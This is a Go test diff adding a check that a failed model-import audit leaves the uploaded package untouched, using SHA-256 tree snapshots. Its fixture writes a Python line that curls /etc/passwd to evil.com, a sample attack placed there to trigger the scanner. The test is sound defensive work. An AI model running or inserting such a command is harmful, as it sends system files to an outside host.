@@ -3,13 +3,18 @@ package controller
 import (
 	"bytes"
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
+	"io/fs"
 	"log"
 	"net/http"
 	"net/http/httptest"
 	"os"
 	"path/filepath"
+	"reflect"
+	"sort"
 	"strings"
 	"testing"
 	"time"
@@ -18,6 +23,91 @@ import (
 	"github.com/CipherSlinger/teetls"
 	"taa/internal/codeaudit"
 )
+
+// treeEntry is one file's identity in a package snapshot: its path relative to
+// the snapshot root, its size, and a digest of its bytes.
+type treeEntry struct {
+	path   string
+	size   int64
+	digest string
+}
+
+// snapshotTree records every file under dir as a path-sorted list of
+// (relative path, size, content digest). Directories are not recorded: an empty
+// directory is the residue a "cleanDirContents" style wipe leaves behind, and
+// counting it would let a wiped tree match a populated one. The digest is what
+// makes the comparison a statement about content rather than about names.
+func snapshotTree(t *testing.T, dir string) []treeEntry {
+	t.Helper()
+	var entries []treeEntry
+	err := filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
+		if err != nil {
+			return err
+		}
+		if d.IsDir() {
+			return nil
+		}
+		data, err := os.ReadFile(path)
+		if err != nil {
+			return err
+		}
+		rel, err := filepath.Rel(dir, path)
+		if err != nil {
+			return err
+		}
+		sum := sha256.Sum256(data)
+		entries = append(entries, treeEntry{path: rel, size: int64(len(data)), digest: hex.EncodeToString(sum[:])})
+		return nil
+	})
+	if err != nil {
+		t.Fatalf("snapshot %s: %v", dir, err)
+	}
+	sort.Slice(entries, func(i, j int) bool { return entries[i].path < entries[j].path })
+	return entries
+}
+
+// TestFailedAuditLeavesTheImportedPackageUntouched pins the rule the audit is
+// under: it reads, it judges, it reports, and it changes nothing. The failure it
+// guards is not hypothetical - the audit gate used to call cleanDirContents on
+// the model directory whenever the verdict was not a pass, so a false positive
+// did not just refuse an import, it destroyed the artifact the operator had
+// uploaded.
+//
+// The whole tree is compared, not one path: "we only deleted the checkpoints"
+// is the same defect with a smaller blast radius, and the dependency libraries a
+// model package bundles live in that same tree.
+func TestFailedAuditLeavesTheImportedPackageUntouched(t *testing.T) {
+	state, _ := setupTestState(t)
+	modelDir := t.TempDir()
+	// The same shape the neighbouring static-fail test uses for a non-passing
+	// verdict: a source file the static scan refuses.
+	code := `import subprocess
+subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
+`
+	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	// A bundled dependency library, so the comparison also covers a file no
+	// code path has any reason to rewrite.
+	if err := os.WriteFile(filepath.Join(modelDir, "libnative.so"), []byte("\x7fELF native dependency\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	state.Security.ScanEnabled = true
+	state.Security.ModelDir = modelDir
+	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
+	state.DockerID = "docker-test"
+
+	before := snapshotTree(t, modelDir)
+	passed := state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
+	if passed {
+		t.Fatal("fixture is wrong: this package is supposed to fail the audit")
+	}
+	after := snapshotTree(t, modelDir)
+	if !reflect.DeepEqual(before, after) {
+		t.Errorf("the audit changed the package it audited:\n before: %v\n after: %v", before, after)
+	}
+}
 
 func TestLLMAvailable(t *testing.T) {
 	ready := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
